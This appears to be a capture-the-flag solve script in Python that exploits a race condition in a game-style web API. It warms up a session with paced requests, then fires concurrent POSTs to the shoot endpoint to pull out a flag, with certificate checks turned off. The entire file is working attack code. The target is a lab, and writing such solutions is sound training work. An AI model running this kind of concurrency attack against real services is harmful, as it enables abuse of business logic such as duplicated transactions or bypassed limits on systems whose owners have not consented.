#!/usr/bin/env python3
import concurrent.futures
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://ed25472fd89a.boroctf.com"
COOLDOWN_SECONDS = 1.62
WARMUP_SHOTS = 22
RACE_WORKERS = 8
MAX_ATTEMPTS = 3


def warmup(session: requests.Session) -> None:
    session.get(f"{BASE_URL}/", timeout=10)
    for shot in range(1, WARMUP_SHOTS + 1):
        response = session.post(f"{BASE_URL}/api/shoot", timeout=10)
        response.raise_for_status()
        payload = response.json()
        score = payload.get("score")
        print(f"[warmup] shot {shot:02d} -> {score}")
        time.sleep(COOLDOWN_SECONDS)


def race_for_flag(session: requests.Session) -> str | None:
    state = session.get(f"{BASE_URL}/api/state", timeout=10)
    state.raise_for_status()
    print(f"[race] state before race: {state.text.strip()}")

    def fire(_: int) -> dict:
        response = session.post(f"{BASE_URL}/api/shoot", timeout=10)
        response.raise_for_status()
        return response.json()

    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as executor:
        responses = list(executor.map(fire, range(RACE_WORKERS)))

    for index, payload in enumerate(responses, start=1):
        print(f"[race] worker {index:02d} -> {payload}")
        if "flag" in payload:
            return payload["flag"]
    return None


def main() -> int:
    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"[*] attempt {attempt}/{MAX_ATTEMPTS}")
        session = requests.Session()
        session.verify = False

        try:
            warmup(session)
            flag = race_for_flag(session)
            if flag:
                print(f"[+] flag: {flag}")
                return 0
        except Exception as exc:  # pragma: no cover - diagnostic path
            print(f"[!] error: {exc}")

        print("[!] attempt failed, retrying with a fresh session")

    print("[-] failed to retrieve flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
